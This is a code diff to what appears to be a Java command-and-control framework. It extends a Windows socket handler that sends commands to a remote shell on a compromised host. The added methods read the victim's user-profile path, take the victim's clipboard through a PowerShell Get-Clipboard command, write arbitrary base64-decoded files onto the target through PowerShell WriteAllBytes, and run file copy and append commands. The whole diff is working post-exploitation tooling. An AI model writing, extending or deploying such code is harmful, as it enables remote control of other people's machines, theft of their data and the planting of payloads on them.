@@ -10,10 +10,11 @@ import java.util.List;
 import c2.Constants;
 import c2.session.IOManager;
 import util.Time;
+import util.test.OutputStreamWriterHelper;
 
 public class WindowsSocketReader extends SocketReader {
 
-	private static final String WINDOWS_LINE_SEP = "\r\n";
+	public static final String WINDOWS_LINE_SEP = "\r\n";
 
 	// This flag is set if the first line of the response is a echo of the command
 	// which needs to be stripped
@@ -220,6 +221,74 @@ public class WindowsSocketReader extends SocketReader {
 			return lines[0];
 		} catch (Exception ex) {
 			return "Unable to query current working directory";
+		}
+	}
+
+	@Override
+	public String getUserDirectory(OutputStreamWriter bw, int sessionId) {
+		try {
+			OutputStreamWriterHelper.writeAndSend(bw, "echo %USERPROFILE%" + WINDOWS_LINE_SEP);
+			String response = readUnknownLinesFromSocketWithTimeout(1000);
+			String lines[] = response.split(WINDOWS_LINE_SEP);
+			return lines[0];
+		} catch (Exception ex) {
+			return "Unable to query user directory";
+		}
+	}
+
+	@Override
+	public String getClipboard(OutputStreamWriter bw, int sessionId) {
+		try {
+			String clipCommand = "powershell -command \"Get-Clipboard\"";
+			bw.write(clipCommand);
+			// System.out.println(clipCommand);
+			bw.write(System.lineSeparator());
+			bw.flush();
+			// System.out.println("Reading...");
+			return readUnknownLinesFromSocketWithTimeout(1000);
+			/*
+			OutputStreamWriterHelper.writeAndSend(bw, "powershell -command \"Get-Clipboard\"" + WindowsSocketReader.WINDOWS_LINE_SEP);
+			return readUnknownLinesFromSocketWithTimeout(1000);
+			*/
+		} catch (Exception ex) {
+			return "Unable to get clipboard";
+		}
+	}
+
+	@Override
+	public String downloadBase64File(String filename, String b64, OutputStreamWriter bw, int sessionId)
+			{
+		try {
+			String downloadCommand = "powershell -c \"[IO.File]::WriteAllBytes('" + filename
+				+ "', [Convert]::FromBase64String('" + b64 + "'))\"";
+			OutputStreamWriterHelper.writeAndSend(bw, downloadCommand + WindowsSocketReader.WINDOWS_LINE_SEP);
+			return readUnknownLinesFromSocketWithTimeout(1000);
+		} catch (Exception ex) {
+			return "Unable to write file";
+		}
+	}
+
+	@Override
+	public String executeCatCopyCommand(OutputStreamWriter bw, int sessionId, String cmd) {
+		try {
+			String modCmd = cmd.replace("cat ", "type ");
+			OutputStreamWriterHelper.writeAndSend(bw, modCmd + WindowsSocketReader.WINDOWS_LINE_SEP);
+			readUnknownLinesFromSocketWithTimeout(1000);
+			return "File write executed";
+		} catch (Exception ex) {
+			return "Unable to write file";
+		}
+	}
+
+	@Override
+	public String executeCatAppendCommand(OutputStreamWriter bw, int sessionId, String cmd) {
+		try {
+			String modCmd = cmd.replace("cat ", "type ");
+			OutputStreamWriterHelper.writeAndSend(bw, modCmd + WindowsSocketReader.WINDOWS_LINE_SEP);
+			readUnknownLinesFromSocketWithTimeout(1000);
+			return "Appended file";
+		} catch (Exception ex) {
+			return "Unable to write file";
 		}
 	}
 }
